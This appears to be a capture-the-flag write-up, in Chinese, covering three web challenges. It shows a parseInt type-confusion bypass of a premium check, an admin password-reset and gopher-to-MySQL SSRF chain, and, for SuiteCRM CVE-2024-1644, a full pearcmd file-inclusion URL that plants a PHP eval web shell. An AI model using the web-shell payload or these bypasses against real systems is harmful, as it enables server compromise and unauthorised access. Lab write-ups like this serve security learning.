## cool_index
```js
app.post("/article", (req, res) => {
    const token = req.cookies.token;
    if (token) {
        try {
            const decoded = jwt.verify(token, JWT_SECRET);
            let index = req.body.index;
            if (req.body.index < 0) {
                return res.status(400).json({ message: "你知道我要说什么" });
            }
            if (decoded.subscription !== "premium" && index >= 7) {
                return res
                    .status(403)
                    .json({ message: "订阅高级会员以解锁" });
            }
            index = parseInt(index);
            if (Number.isNaN(index) || index > articles.length - 1) {
                return res.status(400).json({ message: "你知道我要说什么" });
            }
  
            return res.json(articles[index]);
        } catch (error) {
            res.clearCookie("token");
            return res.status(403).json({ message: "重新登录罢" });
        }
    } else {
        return res.status(403).json({ message: "未登录" });
    }
});
```

index的处理是在高级会员判断完成后再处理的，传入`7a`判断时不等于parseInt会转化为7输出flag

![](attachments/Pasted%20image%2020240422091952.png)

## EasySignin
普通注册用户无法查看图片，在修改密码时将传参用户名修改为admin
![](attachments/Pasted%20image%2020240422103924.png)

gopher协议探测到mysql服务
![](attachments/Pasted%20image%2020240422104025.png)

![](attachments/Pasted%20image%2020240422105750.png)

尾部二次编码

![](attachments/Pasted%20image%2020240422105816.png)

base64解码

![](attachments/Pasted%20image%2020240422105857.png)

## SuiteCRM
CVE-2024-1644
直接文件包含pearcmd
![](attachments/Pasted%20image%2020240422110254.png)

`http://65355f06-a589-4c13-95d6-a4fab4ba0d12.node5.buuoj.cn/index.php//usr/local/lib/php/pearcmd.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=@eval($_POST['cmd']);?>+/tmp/shell.php`

